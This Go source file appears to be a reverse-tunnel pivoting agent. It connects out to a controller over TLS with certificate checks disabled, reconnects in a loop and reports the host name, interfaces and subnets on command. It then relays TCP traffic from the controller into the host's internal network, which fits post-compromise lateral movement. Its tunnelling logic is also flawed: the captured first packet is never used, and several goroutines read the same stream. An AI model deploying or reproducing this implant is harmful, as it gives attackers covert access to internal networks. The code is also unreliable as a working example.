package main

import (
        "bufio"
        "crypto/tls"
        "flag"
        "fmt"
        "io"
        "net"
        "os"
        "strings"
        "time"

        "github.com/hashicorp/yamux"
)

func fnGetIfconfig() string {
        interfaces, err := net.Interfaces()
        if err != nil {
                return fmt.Sprintf("Erro ao obter interfaces: %v", err)
        }

        var sb strings.Builder
        for i, iface := range interfaces {
                sb.WriteString(fmt.Sprintf("\nInterface %d\n", i))
                sb.WriteString(fmt.Sprintf("----------------------------------------\n"))
                sb.WriteString(fmt.Sprintf("Name        : %s\n", iface.Name))
                sb.WriteString(fmt.Sprintf("Hardware MAC: %s\n", iface.HardwareAddr.String()))
                sb.WriteString(fmt.Sprintf("MTU         : %d\n", iface.MTU))
                sb.WriteString(fmt.Sprintf("Flags       : %v\n", iface.Flags.String()))

                addrs, err := iface.Addrs()
                if err == nil {
                        for _, addr := range addrs {
                                if strings.Contains(addr.String(), ":") {
                                        sb.WriteString(fmt.Sprintf("IPv6 Address: %s\n", addr.String()))
                                } else {
                                        sb.WriteString(fmt.Sprintf("IPv4 Address: %s\n", addr.String()))
                                }
                        }
                }
        }
        return sb.String()
}

func fnGetRoutes() string {
        interfaces, err := net.Interfaces()
        if err != nil {
                return ""
        }

        var routes []string
        for _, iface := range interfaces {
                if iface.Flags&net.FlagUp == 0 || iface.Flags&net.FlagLoopback != 0 {
                        continue
                }
                addrs, err := iface.Addrs()
                if err != nil {
                        continue
                }
                for _, addr := range addrs {
                        if ipNet, ok := addr.(*net.IPNet); ok {
                                if ipNet.IP.To4() != nil {
                                        routes = append(routes, addr.String())
                                }
                        }
                }
        }
        return strings.Join(routes, ",")
}

func handleUserlandTunnel(tunStream net.Conn) {
        defer tunStream.Close()
        lenBuf := make([]byte, 2)

        for {
                _, err := io.ReadFull(tunStream, lenBuf)
                if err != nil {
                        break
                }
                pktLen := int(lenBuf[0])<<8 | int(lenBuf[1])
                if pktLen <= 0 || pktLen > 2000 {
                        break
                }
                pktBuf := make([]byte, pktLen)
                _, err = io.ReadFull(tunStream, pktBuf)
                if err != nil {
                        break
                }

                if len(pktBuf) < 20 {
                        continue
                }
                ipVerHLen := pktBuf[0]
                version := ipVerHLen >> 4
                if version != 4 {
                        continue
                }
                ihl := int(ipVerHLen&0x0f) * 4
                if len(pktBuf) < ihl+4 {
                        continue
                }

                proto := pktBuf[9]
                
                if proto != 6 { 
                        continue
                }

                destIP := net.IPv4(pktBuf[16], pktBuf[17], pktBuf[18], pktBuf[19])
                tcpHeaderOffset := ihl
                if len(pktBuf) < tcpHeaderOffset+4 {
                        continue
                }
                destPort := uint16(pktBuf[tcpHeaderOffset+2])<<8 | uint16(pktBuf[tcpHeaderOffset+3])

                targetAddr := fmt.Sprintf("%s:%d", destIP.String(), destPort)

                go func(target string, initialPkt []byte) {
                        targetConn, err := net.Dial("tcp", target)
                        if err != nil {
                                return
                        }
                        defer targetConn.Close()


                        go func() {
                                io.Copy(targetConn, tunStream)
                        }()
                        io.Copy(tunStream, targetConn)
                }(targetAddr, pktBuf)
        }
}

func main() {
        connectTarget := flag.String("connect", "127.0.0.1:8080", "Endereço do controlador para se conectar (IP:Porta)")
        flag.Parse()

        tlsConfig := &tls.Config{
                InsecureSkipVerify: true,
        }

        for {
                conn, err := tls.Dial("tcp", *connectTarget, tlsConfig)
                if err != nil {
                        time.Sleep(5 * time.Second)
                        continue
                }

                session, err := yamux.Client(conn, nil)
                if err != nil {
                        conn.Close()
                        time.Sleep(5 * time.Second)
                        continue
                }

                ctrlStream, err := session.OpenStream()
                if err != nil {
                        session.Close()
                        conn.Close()
                        time.Sleep(5 * time.Second)
                        continue
                }

                hostname, _ := os.Hostname()
                if hostname == "" {
                        hostname = "target-client"
                }
                ctrlStream.Write([]byte(hostname))

                go func() {
                        reader := bufio.NewReader(ctrlStream)
                        for {
                                cmd, err := reader.ReadString('\n')
                                if err != nil {
                                        break
                                }
                                cmd = strings.TrimSpace(cmd)
                                if cmd == "ifconfig" {
                                        info := fnGetIfconfig()
                                        ctrlStream.Write([]byte(info))
                                } else if cmd == "autoroute" {
                                        routes := fnGetRoutes()
                                        ctrlStream.Write([]byte(routes))
                                } else if cmd == "ping" {
                                        continue
                                }
                        }
                }()

                for {
                        tunStream, err := session.AcceptStream()
                        if err != nil {
                                break
                        }

                        go handleUserlandTunnel(tunStream)
                }

                session.Close()
                conn.Close()
                time.Sleep(5 * time.Second)
        }
}
